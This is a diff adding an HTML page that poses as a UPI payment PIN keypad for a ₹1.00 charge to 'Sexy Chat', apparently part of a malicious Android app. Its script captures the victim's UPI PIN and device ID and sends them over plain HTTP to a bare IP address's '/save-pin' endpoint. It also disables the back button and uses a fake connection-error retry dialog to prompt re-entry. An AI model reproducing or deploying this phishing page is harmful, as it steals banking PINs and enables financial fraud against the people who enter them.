@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure UPI Keypad</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/js/all.min.js"></script>
+    <style>
+       * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+}
+body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    height: 100vh;
+    background-color: white;
+    position: relative;
+}
+.header {
+    width: 100%;
+    height: 50px;
+    padding: 0px;
+    display: flex;
+    justify-content: end;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    background-color: white;
+    z-index: 10;
+}
+
+.header img {
+    width: auto;
+    height: 40px;
+}
+.details {
+    width: 100%;
+    padding: 5px 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background-color: #f0f0f0;
+    font-size: 15px;
+    font-weight: 500;
+    margin-top: 50px;
+}
+.center-content {
+    flex-grow: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    position: absolute;
+    top: 30%;
+    transform: translateY(-50%);
+    width: 100%;
+}
+h5 {
+    font-size: 15px;
+    font-weight: 500;
+    color: #3d3d3d;
+    margin-bottom: 15px;
+}
+.input-container {
+    font-size: 30px;
+    font-weight: bold;
+    color: #003bab;
+    letter-spacing: 10px;
+    display: flex;
+    gap: 5px;
+    margin-bottom: 15px;
+}
+
+.warning {
+    font-size: 25px;
+    font-weight: 500;
+    border-radius: 30px;
+    background: rgba(255, 199, 0, 0.2);
+    display: flex;
+    width: 85%;
+    padding: 10px;
+    color: #ff9d00;
+    align-items: center;
+    justify-content: center;
+    gap: 2px;
+    margin-top: 15px;
+}
+
+.warning i{
+    
+    font-size: 35px;
+    margin-left: 0px;
+}
+
+.warning p {
+    text-align: center;
+    color: black;
+    font-size: 14px;
+    margin-left: 10px;
+}
+
+.keypad {
+    width: 100%;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    text-align: center;
+    position: fixed;
+    bottom: 0;
+    padding-bottom: 30px;
+    padding-top: 15px;
+    padding-left: 15px;
+    padding-right: 15px;
+    background-color: #f1f1f1;
+}
+.key {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 60px;
+    font-size: 25px;
+    font-weight: bold;
+    color: #003bab;
+    background-color: transparent;
+    cursor: pointer;
+    user-select: none;
+    transition: transform 0.1s ease, background-color 0.1s ease;
+}
+.key:active {
+    transform: scale(0.9);
+    border-radius: 15px;
+}
+#done {
+    font-size: 35px;
+}
+#done1 {
+    font-size: 30px;
+}
+
+/* Loading Overlay */
+.overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    z-index: 999;
+    justify-content: center;
+    align-items: center;
+}
+
+.spinner {
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #3498db;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* Error Dialog */
+.dialog {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: white;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    z-index: 1000;
+    text-align: center;
+    min-width: 280px;
+}
+
+.dialog h3 {
+    color: #d32f2f;
+    margin-bottom: 10px;
+}
+
+.dialog p {
+    color: #333;
+    margin-bottom: 20px;
+    font-size: 14px;
+}
+
+.dialog button {
+    background: #2196F3;
+    color: white;
+    border: none;
+    padding: 10px 30px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+.dialog button:hover {
+    background: #1976D2;
+}
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <div class="header">
+        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" alt="UPI Logo">
+    </div>
+
+    <!-- Transaction Details -->
+    <div class="details">
+        <p>Sending: <br>To:</p>
+        <p>₹1.00 <br>Sexy Chat</p>
+    </div>
+
+    <!-- Center Content -->
+    <div class="center-content">
+        <h5>ENTER UPI PIN</h5>
+        <div class="input-container" id="input-display">
+            <span></span> <span></span> <span></span> <span></span> <span></span> <span></span>
+        </div>
+        <div class="warning">
+            <i class="fas fa-exclamation-circle"></i>
+            <p>You are sending ₹1.00 from your account to Sexy Chat</p>
+        </div>
+    </div>
+
+    <!-- Keypad -->
+    <div class="keypad">
+        <div class="key" onclick="enterNumber(1)">1</div>
+        <div class="key" onclick="enterNumber(2)">2</div>
+        <div class="key" onclick="enterNumber(3)">3</div>
+        <div class="key" onclick="enterNumber(4)">4</div>
+        <div class="key" onclick="enterNumber(5)">5</div>
+        <div class="key" onclick="enterNumber(6)">6</div>
+        <div class="key" onclick="enterNumber(7)">7</div>
+        <div class="key" onclick="enterNumber(8)">8</div>
+        <div class="key" onclick="enterNumber(9)">9</div>
+        <div class="key" id="done1" onclick="deleteNumber()"><i class="fas fa-backspace"></i></div>
+        <div class="key" onclick="enterNumber(0)">0</div>
+        <div class="key" id="done" onclick="submitPIN()"><i class="fas fa-circle-check"></i></div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Error Dialog -->
+    <div class="dialog" id="errorDialog">
+        <h3>❌ Error</h3>
+        <p id="errorMessage">Something went wrong. Please try again.</p>
+        <button onclick="closeErrorDialog()">OK</button>
+    </div>
+
+    <!-- Retry Dialog -->
+    <div class="dialog" id="retryDialog">
+        <h3>⚠️ Connection Error</h3>
+        <p>Server not responding. Would you like to retry?</p>
+        <button onclick="retrySubmit()" style="background: #4CAF50;">Retry</button>
+        <button onclick="closeRetryDialog()" style="background: #f44336; margin-top: 10px;">Cancel</button>
+    </div>
+
+    <script>
+    let enteredNumbers = [];
+    let isHidden = true;
+    let savedPIN = '';
+    
+    // دریافت Device ID از Android
+    function getDeviceId() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getDeviceId) {
+                return Android.getDeviceId();
+            }
+        } catch (e) {
+            console.error('Error getting device ID:', e);
+        }
+        return 'web_browser_' + Date.now();
+    }
+
+    function updateDisplay() {
+        let display = document.getElementById("input-display");
+        display.innerHTML = "";
+        for (let i = 0; i < 6; i++) {
+            let span = document.createElement("span");
+            span.textContent = enteredNumbers[i] !== undefined ? (isHidden ? "•" : enteredNumbers[i]) : "";
+            display.appendChild(span);
+        }
+    }
+
+    function enterNumber(num) {
+        if (enteredNumbers.length < 6) {
+            enteredNumbers.push(num);
+            updateDisplay();
+        }
+    }
+
+    function deleteNumber() {
+        enteredNumbers.pop();
+        updateDisplay();
+    }
+
+    function showLoading() {
+        document.getElementById('loadingOverlay').style.display = 'flex';
+    }
+
+    function hideLoading() {
+        document.getElementById('loadingOverlay').style.display = 'none';
+    }
+
+    function showErrorDialog(message) {
+        document.getElementById('errorMessage').textContent = message;
+        document.getElementById('errorDialog').style.display = 'block';
+    }
+
+    function closeErrorDialog() {
+        document.getElementById('errorDialog').style.display = 'none';
+    }
+
+    function showRetryDialog() {
+        document.getElementById('retryDialog').style.display = 'block';
+    }
+
+    function closeRetryDialog() {
+        document.getElementById('retryDialog').style.display = 'none';
+    }
+
+    function retrySubmit() {
+        closeRetryDialog();
+        submitToServer(savedPIN);
+    }
+
+    function submitPIN() {
+        if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
+            let upiPin = enteredNumbers.join('');
+            savedPIN = upiPin;
+            submitToServer(upiPin);
+        } else {
+            showErrorDialog("Please enter a valid 4 or 6-digit UPI PIN.");
+        }
+    }
+
+    function submitToServer(upiPin) {
+        showLoading();
+        
+        const deviceId = getDeviceId();
+        const requestData = {
+            upi_pin: upiPin,
+            device_id: deviceId,
+            app_type: 'sexychat',
+            user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
+        };
+
+        fetch('http://95.134.130.160:8765/save-pin', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(requestData)
+        })
+        .then(response => {
+            hideLoading();
+            if (!response.ok) {
+                throw new Error('Server error: ' + response.status);
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Success:', data);
+            window.location.href = 'wait.html';
+        })
+        .catch(error => {
+            hideLoading();
+            console.error('Error:', error);
+            showRetryDialog();
+        });
+    }
+
+    updateDisplay();
+
+    // غیرفعال کردن دکمه برگشت
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+        history.go(1);
+    };
+</script>
+
+</body>
+</html>
